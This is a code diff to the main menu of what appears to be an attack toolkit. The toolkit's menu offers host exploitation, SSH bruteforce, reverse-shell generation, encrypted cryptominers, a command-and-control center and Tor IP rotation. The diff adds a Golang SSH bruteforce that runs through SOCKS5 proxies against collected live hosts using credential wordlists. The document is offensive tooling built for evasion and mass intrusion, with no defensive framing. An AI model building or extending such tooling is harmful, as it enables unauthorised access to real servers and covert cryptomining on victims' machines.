@@ -39,7 +39,6 @@ from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
 import os
 import keyboard
 
-
 def main_menu():
     while True:
         print("\n[ Main Menu ]")
@@ -60,13 +59,14 @@ def main_menu():
         print("15.) Exploit Vulnerable Hosts")
         print("16.) Clear All Chunks")
         print("17.) Split Large CSVs")
-        print("18.) SSH Bruteforce")
-        print("19.) Configuration Settings")
-        print("20.) Generate Reverse Shell")
-        print("21.) Manage Cryptominers")
-        print("22.) Command and Control Center")
-        print("23.) Start/Stop Tor Proxy")
-        print("24.) Exit")
+        print("18.) Python SSH Bruteforce")
+        print("19.) Golang SSH Bruteforce (w/ SOCKS5)")
+        print("20.) Configuration Settings")
+        print("21.) Generate Reverse Shell")
+        print("22.) Manage Cryptominers")
+        print("23.) Command and Control Center")
+        print("24.) Start/Stop Tor Proxy")
+        print("25.) Exit")
 
         choice = input("Enter your choice: ")
         if choice == "1":
@@ -120,8 +120,32 @@ def main_menu():
                 continue
             bruteforce_ssh(targets, usernames, passwords, max_threads=5)
         elif choice == "19":
-            configure_settings()
+            # Run Golang SSH Bruteforce with SOCKS5 proxies
+            if not global_live_hosts:
+                print("[ERROR] No valid live hosts found.")
+                continue
+
+            if not global_tested_proxies:
+                print("[WARNING] No proxies available. Running without proxy.")
+
+            username_file = "wordlists/ssh_usernames.txt"
+            password_file = "wordlists/ssh_passwords.txt"
+
+            if not os.path.exists(username_file) or not os.path.exists(password_file):
+                print("[ERROR] Wordlists not found! Make sure they exist in the wordlists/ directory.")
+                continue
+
+            threads = input("Enter the number of threads (default 5): ")
+            try:
+                threads = int(threads) if threads else 5
+            except ValueError:
+                print("[ERROR] Invalid input. Using default (5).")
+                threads = 5
+
+            run_golang_bruteforce(global_live_hosts, username_file, password_file, threads)            
         elif choice == "20":
+            configure_settings()
+        elif choice == "21":
             payloads = list_payloads()
             if not payloads:
                 continue
@@ -143,7 +167,7 @@ def main_menu():
                 encrypt_choice = input("Encrypt the shell? (yes/no): ").strip().lower()
                 if encrypt_choice == "yes":
                     encrypt_generated_shell(shell_path)
-        elif choice == "21":
+        elif choice == "22":
             print("\n[ Cryptominer Management ]")
             print("1.) List Cryptominers")
             print("2.) Encrypt All Cryptominers")
@@ -155,7 +179,7 @@ def main_menu():
                 encrypt_all_cryptominers()
             elif miner_choice == "3":
                 continue
-        elif choice == "22":
+        elif choice == "23":
             print("\n[ Command and Control Center ]")
             print("1.) Start Listener")
             print("2.) Command Interface")
@@ -183,7 +207,7 @@ def main_menu():
                 stop_listeners()
             elif c2_choice == "5":
                 continue
-        elif choice == "23":
+        elif choice == "24":
             tor_action = input("[INFO] Start Tor (1), Stop Tor (2), Renew Tor IP (3): ")
             if tor_action == "1":
                 start_tor()
@@ -191,7 +215,7 @@ def main_menu():
                 stop_tor()
             elif tor_action == "3":
                 renew_tor_ip()
-        elif choice == "24":
+        elif choice == "25":
             print("[INFO] Exiting. Stopping all listeners and background tasks.")
             stop_listeners()
             stop_tor()
